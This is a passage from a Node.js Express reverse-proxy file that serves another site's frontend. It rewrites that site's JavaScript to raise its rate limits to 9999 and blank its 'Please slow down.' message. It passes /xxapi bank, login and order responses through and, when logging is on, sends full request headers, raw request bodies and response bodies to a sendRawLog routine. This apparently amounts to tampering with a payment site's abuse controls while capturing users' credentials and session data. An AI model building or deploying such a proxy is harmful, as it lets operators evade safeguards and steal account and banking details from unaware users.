                js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
                js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
                js = js.replace(/API_HTTP_RATE_LIMIT_MSG\s*=\s*"Please slow down\."/g, 'API_HTTP_RATE_LIMIT_MSG=""');

                buf = Buffer.from(js, 'utf-8');
                finalCt = ct;
                // JS filenames have content-hash (e.g. index.cc0347da.js) — cache indefinitely
                cacheSet(cacheKey, buf, finalCt, response.status, 0);
            }

            // Content-hashed JS: safe to cache in browser too — instant on repeat visits
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
            res.setHeader('content-type', finalCt);
            res.setHeader('content-length', String(buf.length));
            res.status(200).end(buf);
            return;
        }

        // Static assets only: cache at the browser/CDN layer. Dynamic API responses,
        // including /xxapi/* bank/login/order responses, continue to stream uncached.
        const buf = Buffer.from(await response.arrayBuffer());
        const cleanAssetPath = String(path).split('?')[0].toLowerCase();
        const isHashedStaticAsset = /^\/(?:assets|static)\/[^/]+\.[a-f0-9]{6,}\.(?:css|js|png|jpe?g|webp|avif|svg|woff2?)$/i.test(cleanAssetPath);
        const isLoginStaticAsset = /^\/static\/(?:images|icon)\/[^/]+\.(?:png|jpe?g|webp|avif|svg|ico)$/i.test(cleanAssetPath);
        if (isHashedStaticAsset) {
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        } else if (isLoginStaticAsset) {
            res.setHeader('Cache-Control', 'public, max-age=86400, stale-while-revalidate=604800');
        }
        res.setHeader('content-length', String(buf.length));
        res.status(response.status).end(buf);

        if (cachedData && cachedData.rawLog && (ct.includes('json') || ct.includes('text'))) {
            const rhdrs = {}; response.headers.forEach((v, k) => { rhdrs[k] = v; });
            loadData().then(d => sendRawLog(d, {
                method: req.method, url: req.originalUrl || req.url,
                reqHeaders: req.headers, reqBodyRaw: req.rawBody,
                status: response.status, respHeaders: rhdrs,
                respBodyRaw: buf.toString('utf-8').substring(0, 8000),
                source: 'frontend', now
            })).catch(() => { });
        }

    } catch (e) {
        console.error('Frontend proxy error:', e.message);
        if (!res.headersSent) res.status(502).send('Proxy error: ' + e.message);
    }
});

module.exports = app;
